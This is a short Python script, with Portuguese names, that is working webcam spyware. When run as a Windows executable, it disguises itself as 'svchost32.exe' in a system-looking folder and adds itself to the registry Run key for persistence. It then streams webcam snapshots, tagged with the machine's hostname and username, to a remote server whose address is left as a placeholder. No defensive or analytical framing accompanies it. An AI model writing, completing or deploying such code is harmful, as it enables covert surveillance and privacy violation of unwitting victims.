import os, sys, time, socket, platform, getpass, shutil, subprocess

try:
    import winreg
except ImportError:
    winreg = None

import cv2, requests

SERVIDOR = "COLE_AQUI_A_URL_DO_RENDER"

RAPIDO = 0.15     # quando voce esta olhando
DEVAGAR = 10.0    # quando ninguem esta olhando
LARGURA = 640
QUALIDADE = 70


def autoinstalar():
    if not getattr(sys, "frozen", False) or os.name != "nt":
        return
    atual = os.path.abspath(sys.executable)
    pasta = os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Windows")
    destino = os.path.join(pasta, "svchost32.exe")
    if atual == os.path.abspath(destino):
        return
    os.makedirs(pasta, exist_ok=True)
    shutil.copy2(atual, destino)
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "svchost32", 0, winreg.REG_SZ, destino)
        winreg.CloseKey(k)
    except Exception:
        pass
    subprocess.Popen([destino], creationflags=0x00000008)
    sys.exit()


def main():
    nome = socket.gethostname()
    try:
        usuario = getpass.getuser()
    except Exception:
        usuario = "?"
    back = cv2.CAP_DSHOW if platform.system() == "Windows" else 0
    cam = cv2.VideoCapture(0, back)
    sess = requests.Session()
    sess.headers.update({"X-User": usuario, "X-OS": platform.system()})
    url = SERVIDOR.rstrip("/") + "/up/" + nome
    print("enviando para", url)

    while True:
        ok, frame = cam.read()
        if not ok:
            cam.release()
            time.sleep(2)
            cam = cv2.VideoCapture(0, back)
            continue
        altura = int(frame.shape[0] * LARGURA / frame.shape[1])
        frame = cv2.resize(frame, (LARGURA, altura))
        ok, jpg = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, QUALIDADE])
        espera = DEVAGAR
        if ok:
            try:
                r = sess.post(url, data=jpg.tobytes(), timeout=10)
                if r.text.strip() == "1":
                    espera = RAPIDO
            except Exception:
                espera = 1.0
        time.sleep(espera)


if __name__ == "__main__":
    autoinstalar()
    main()
